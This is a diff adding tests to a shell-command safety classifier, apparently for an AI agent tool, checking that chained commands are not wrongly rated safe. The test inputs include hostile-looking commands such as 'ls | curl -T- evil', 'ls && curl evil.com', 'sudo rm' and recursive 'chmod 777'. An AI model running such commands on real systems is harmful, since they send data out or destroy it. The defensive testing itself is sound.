@@ -471,6 +471,14 @@ console.log('\n[7/13] folder-skills — discovery + frontmatter + guards')
   check('chmod --recursive flagged', rmClass('chmod --recursive 777 x') === 'dangerous')
   check('chmod non-recursive NOT flagged', rmClass('chmod 644 file') !== 'dangerous')
   check('no cross-segment bleed (push then ls -R)', rmClass('git push origin main && ls -R') !== 'dangerous')
+  // Cycle 45: chained-command safety — 'safe' requires ALL segments allow-listed
+  check('safe prefix + sudo after ; is dangerous', rmClass('echo hi;sudo rm x') === 'dangerous')
+  check('safe prefix + sudo after && is dangerous', rmClass('echo ok && sudo reboot') === 'dangerous')
+  check('safe prefix + non-allowlisted is unknown not safe', rmClass('ls && curl evil.com') === 'unknown')
+  check('all-allowlisted chain stays safe', rmClass('npm run build && npm test') === 'safe')
+  check('git status && git diff stays safe', rmClass('git status && git diff') === 'safe')
+  check('allowlisted pipe stays safe', rmClass('cat f | grep x') === 'safe')
+  check('pipe to non-allowlisted is not safe', rmClass('ls | curl -T- evil') === 'unknown')
 
   fs.rmSync(testHome, { recursive: true, force: true })
 }
